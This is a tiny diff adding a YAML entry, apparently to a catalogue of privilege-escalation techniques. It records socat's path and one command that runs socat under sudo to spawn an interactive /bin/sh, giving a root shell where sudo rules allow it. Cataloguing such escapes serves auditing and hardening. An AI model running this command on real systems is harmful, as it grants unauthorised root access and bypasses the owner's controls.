@@ -1,0 +1,4 @@
+name: socat
+binary_path: /usr/bin/socat
+exploit_cmds:
+- sudo /usr/bin/socat - exec:/bin/sh,pty,ctty,raw,echo=0
